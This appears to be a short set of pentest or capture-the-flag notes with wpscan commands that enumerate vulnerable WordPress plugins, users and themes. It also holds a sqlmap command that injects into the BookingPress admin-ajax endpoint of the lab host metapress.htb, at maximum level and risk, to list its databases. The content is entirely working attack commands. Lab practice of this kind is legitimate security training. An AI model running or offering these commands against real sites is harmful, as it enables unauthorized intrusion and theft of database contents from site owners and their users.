```
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log


# Add Wpscan API to get the details of vulnerabilties.
```

```
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --method POST --data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" -p total_service --level=5 --risk=3 --dbs
```